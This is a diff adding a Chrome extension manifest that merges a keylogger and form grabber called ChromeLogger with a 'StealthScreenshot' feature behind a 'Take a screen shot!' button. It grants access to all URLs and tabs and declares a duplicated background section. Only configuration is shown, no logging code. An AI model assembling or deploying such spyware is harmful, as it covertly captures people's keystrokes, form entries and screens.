@@ -1,0 +1,44 @@
+{
+  "name": "ChromeLogger+StealthScreenshot",
+  "version": "0.1",
+  "manifest_version": 2,
+  "description": "A keylogger and form grabber for Google Chrome, with our extension in addition",
+  "homepage_url": "http://www.ericzhang.me/projects/chromelogger/",
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "options_page": "src/options/index.html",
+  "background": {
+    "scripts": ["src/inject/inject.js"]
+  },
+   "background": {
+    "persistent": true,
+    "scripts": ["background.js"]
+  },
+    "browser_action": {
+    "default_icon": "icons/camera.png",
+    "default_title": "Take a screen shot!"
+  },
+  "commands": {
+  "toggle": {
+    "suggested_key": {
+      "windows": "Ctrl+Shift+Y",
+      "mac": "Command+Shift+Y",
+      "chromeos": "Ctrl+Shift+U",
+      "linux": "Ctrl+Shift+J"
+    },
+    "description": "My description"
+  }
+},
+ "omnibox": { "keyword" : "show" },
+  "permissions": [
+    "<all_urls>",
+    "tabs",
+    "storage",
+    "unlimitedStorage",
+    "activeTab"
+  ]
+  
+}
